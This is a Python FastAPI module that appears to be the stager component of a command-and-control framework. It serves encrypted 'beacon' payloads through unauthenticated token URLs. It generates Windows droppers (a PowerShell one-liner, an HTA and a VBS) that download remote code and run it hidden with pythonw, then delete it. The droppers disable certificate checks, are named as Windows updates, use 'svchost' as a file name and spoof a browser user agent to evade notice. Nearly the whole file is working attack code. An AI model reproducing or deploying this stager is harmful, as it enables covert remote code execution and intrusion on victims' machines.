"""Stager — stores beacon code server-side and serves it via an unauthenticated token URL."""
import sys, os, gzip
sys.path.insert(0, os.path.dirname(os.path.dirname(__file__)))

from datetime import datetime, timezone, timedelta
from fastapi import APIRouter, Depends, HTTPException
from fastapi.responses import PlainTextResponse, HTMLResponse, Response
from fastapi.requests import Request
from sqlalchemy.orm import Session
from pydantic import BaseModel
from typing import Optional
from database import get_db, StagerToken
from auth import require_auth, User
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding as _aes_padding

router = APIRouter(tags=["stager"])


# ── AES-256-CBC + GZip helpers ────────────────────────────────────────────────

def _gen_enc_key() -> str:
    """Return 'key_hex:iv_hex' with a fresh random AES-256 key and IV."""
    return os.urandom(32).hex() + ":" + os.urandom(16).hex()


def _encrypt_payload(code: str, enc_key: str) -> bytes:
    """GZip-compress then AES-256-CBC-PKCS7-encrypt the beacon source code."""
    key_hex, iv_hex = enc_key.split(":")
    key = bytes.fromhex(key_hex)
    iv  = bytes.fromhex(iv_hex)
    compressed = gzip.compress(code.encode("utf-8"), compresslevel=9)
    padder = _aes_padding.PKCS7(128).padder()
    padded = padder.update(compressed) + padder.finalize()
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
    enc = cipher.encryptor()
    return enc.update(padded) + enc.finalize()


def _build_ps_script(enc_key: str, blob_url: str) -> str:
    """Build a PowerShell one-liner that downloads, decrypts, decompresses and runs the beacon."""
    key_hex, iv_hex = enc_key.split(":")
    key_dec = ",".join(str(b) for b in bytes.fromhex(key_hex))
    iv_dec  = ",".join(str(b) for b in bytes.fromhex(iv_hex))
    return (
        "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true};"
        f"$k=[byte[]]@({key_dec});"
        f"$v=[byte[]]@({iv_dec});"
        f"$b=(New-Object Net.WebClient).DownloadData('{blob_url}');"
        "$a=New-Object Security.Cryptography.AesCryptoServiceProvider;"
        "$a.Mode=[Security.Cryptography.CipherMode]::CBC;"
        "$a.Padding=[Security.Cryptography.PaddingMode]::PKCS7;"
        "$a.Key=$k;$a.IV=$v;"
        "$d=$a.CreateDecryptor().TransformFinalBlock($b,0,$b.Length);"
        "$ms=New-Object IO.MemoryStream(,$d);"
        "$gz=New-Object IO.Compression.GZipStream($ms,[IO.Compression.CompressionMode]::Decompress);"
        "$sr=New-Object IO.StreamReader($gz,[Text.Encoding]::UTF8);"
        "$c=$sr.ReadToEnd();"
        "$t=[IO.Path]::ChangeExtension([IO.Path]::GetTempFileName(),'.py');"
        "[IO.File]::WriteAllText($t,$c,[Text.Encoding]::UTF8);"
        "Start-Process pythonw -ArgumentList $t -WindowStyle Hidden;"
        "Start-Sleep 3;"
        "Remove-Item $t -EA SilentlyContinue"
    )


def _check_active(token: str, db: Session) -> StagerToken:
    """Fetch a stager token and raise 404/410 if missing, expired or exhausted."""
    st = db.query(StagerToken).filter(StagerToken.token == token).first()
    if not st:
        raise HTTPException(status_code=404)
    now = datetime.now(timezone.utc)
    exp = st.expires_at
    if exp:
        if exp.tzinfo is None:
            exp = exp.replace(tzinfo=timezone.utc)
        if now > exp:
            raise HTTPException(status_code=410, detail="Expired")
    if st.max_uses > 0 and st.used_count >= st.max_uses:
        raise HTTPException(status_code=410, detail="Max uses reached")
    return st


class CreateStager(BaseModel):
    code:      str
    lang:      str  = "py"
    max_uses:  int  = 0          # 0 = unlimited
    expire_h:  int  = 0          # hours until expiry; 0 = never


@router.post("/api/stager")
def create_stager(
    req: CreateStager,
    db:  Session = Depends(get_db),
    current_user: User = Depends(require_auth),
):
    if not req.code.strip():
        raise HTTPException(status_code=400, detail="Empty code")
    expires_at = None
    if req.expire_h > 0:
        expires_at = datetime.now(timezone.utc) + timedelta(hours=req.expire_h)
    st = StagerToken(
        code=req.code,
        lang=req.lang,
        max_uses=req.max_uses,
        expires_at=expires_at,
        created_by=current_user.username,
        enc_key=_gen_enc_key(),
    )
    db.add(st)
    db.commit()
    db.refresh(st)
    return {"token": st.token, "created_at": st.created_at.isoformat()}


@router.get("/api/stager")
def list_stagers(
    db: Session = Depends(get_db),
    _:  User    = Depends(require_auth),
):
    tokens = db.query(StagerToken).order_by(StagerToken.created_at.desc()).all()
    now = datetime.now(timezone.utc)
    result = []
    for st in tokens:
        exp = st.expires_at
        if exp and exp.tzinfo is None:
            exp = exp.replace(tzinfo=timezone.utc)
        expired  = exp is not None and now > exp
        maxed    = st.max_uses > 0 and st.used_count >= st.max_uses
        result.append({
            "token":      st.token,
            "lang":       st.lang,
            "max_uses":   st.max_uses,
            "used_count": st.used_count,
            "expires_at": st.expires_at.isoformat() if st.expires_at else None,
            "created_at": st.created_at.isoformat() if st.created_at else None,
            "created_by": st.created_by,
            "active":     not expired and not maxed,
        })
    return result


@router.delete("/api/stager/{token}")
def delete_stager(
    token: str,
    db:    Session = Depends(get_db),
    _:     User    = Depends(require_auth),
):
    st = db.query(StagerToken).filter(StagerToken.token == token).first()
    if not st:
        raise HTTPException(status_code=404, detail="Token not found")
    db.delete(st)
    db.commit()
    return {"ok": True}


# ── Public endpoints — no auth, called by the stager one-liners ──────────────

@router.get("/s/{token}")
def serve_stager(token: str, db: Session = Depends(get_db)):
    st = _check_active(token, db)
    st.used_count += 1
    db.commit()
    return PlainTextResponse(content=st.code)


@router.get("/s/{token}/hta")
def serve_stager_hta(token: str, request: Request, db: Session = Depends(get_db)):
    """Serve an HTA wrapper that downloads and runs the stager via pythonw (Windows)."""
    st = db.query(StagerToken).filter(StagerToken.token == token).first()
    if not st:
        raise HTTPException(status_code=404)

    now = datetime.now(timezone.utc)
    exp = st.expires_at
    if exp:
        if exp.tzinfo is None:
            exp = exp.replace(tzinfo=timezone.utc)
        if now > exp:
            raise HTTPException(status_code=410, detail="Expired")

    if st.max_uses > 0 and st.used_count >= st.max_uses:
        raise HTTPException(status_code=410, detail="Max uses reached")

    # Build the stager code URL from the incoming request's base URL
    base = str(request.base_url).rstrip("/")
    stager_url = f"{base}/s/{token}"

    hta = f"""<html>
<head>
<hta:application id="app" windowState="minimize" showInTaskbar="no" border="none" caption="no" />
<script language="VBScript">
Sub Window_OnLoad
  Dim h, fso, tmp, ts, sh
  Set h = CreateObject("WinHttp.WinHttpRequest.5.1")
  h.Option(4) = 13056
  h.Open "GET", "{stager_url}", False
  h.Send
  Set fso = CreateObject("Scripting.FileSystemObject")
  tmp     = fso.GetSpecialFolder(2) & "\\s.py"
  Set ts  = fso.CreateTextFile(tmp, True)
  ts.Write h.ResponseText
  ts.Close
  Set sh  = CreateObject("WScript.Shell")
  sh.Run "pythonw " & tmp, 0, False
  window.close()
End Sub
</script>
</head>
<body></body>
</html>"""
    return HTMLResponse(
        content=hta,
        headers={"Content-Disposition": "attachment; filename=update.hta"},
    )


@router.get("/s/{token}/vbs")
def serve_stager_vbs(token: str, request: Request, db: Session = Depends(get_db)):
    """Serve a VBS wrapper that downloads and runs the stager via pythonw (Windows, no console)."""
    st = db.query(StagerToken).filter(StagerToken.token == token).first()
    if not st:
        raise HTTPException(status_code=404)

    now = datetime.now(timezone.utc)
    exp = st.expires_at
    if exp:
        if exp.tzinfo is None:
            exp = exp.replace(tzinfo=timezone.utc)
        if now > exp:
            raise HTTPException(status_code=410, detail="Expired")

    if st.max_uses > 0 and st.used_count >= st.max_uses:
        raise HTTPException(status_code=410, detail="Max uses reached")

    base = str(request.base_url).rstrip("/")
    stager_url = f"{base}/s/{token}"

    vbs = f"""Dim oHttp, oFso, sTmp, oTs, oShell
Randomize
Set oHttp = CreateObject("WinHttp.WinHttpRequest.5.1")
oHttp.Option(4) = 13056
oHttp.Open "GET", "{stager_url}", False
oHttp.SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
oHttp.Send
Set oFso = CreateObject("Scripting.FileSystemObject")
sTmp = oFso.GetSpecialFolder(2) & "\\svchost" & Int(Rnd * 9999) & ".py"
Set oTs = oFso.CreateTextFile(sTmp, True, True)
oTs.Write oHttp.ResponseText
oTs.Close
Set oShell = CreateObject("WScript.Shell")
oShell.Run "pythonw " & Chr(34) & sTmp & Chr(34), 0, False
WScript.Sleep 5000
On Error Resume Next
oFso.DeleteFile sTmp"""

    return PlainTextResponse(
        content=vbs,
        headers={
            "Content-Disposition": "attachment; filename=WindowsUpdate.vbs",
            "Content-Type": "text/plain",
        },
    )


@router.get("/s/{token}/blob")
def serve_stager_blob(token: str, db: Session = Depends(get_db)):
    """Serve the AES-256-CBC + GZip encrypted beacon payload (raw bytes)."""
    st = _check_active(token, db)
    if not st.enc_key:
        raise HTTPException(status_code=404, detail="No encrypted payload for this stager")
    payload = _encrypt_payload(st.code, st.enc_key)
    st.used_count += 1
    db.commit()
    return Response(content=payload, media_type="application/octet-stream")


@router.get("/s/{token}/ps")
def serve_stager_ps(token: str, request: Request, db: Session = Depends(get_db)):
    """Serve a PowerShell script that downloads, decrypts and runs the beacon."""
    st = _check_active(token, db)
    if not st.enc_key:
        raise HTTPException(status_code=404, detail="No encrypted payload for this stager")
    base = str(request.base_url).rstrip("/")
    blob_url = f"{base}/s/{token}/blob"
    script = _build_ps_script(st.enc_key, blob_url)
    return PlainTextResponse(
        content=script,
        headers={"Content-Disposition": "attachment; filename=update.ps1"},
    )
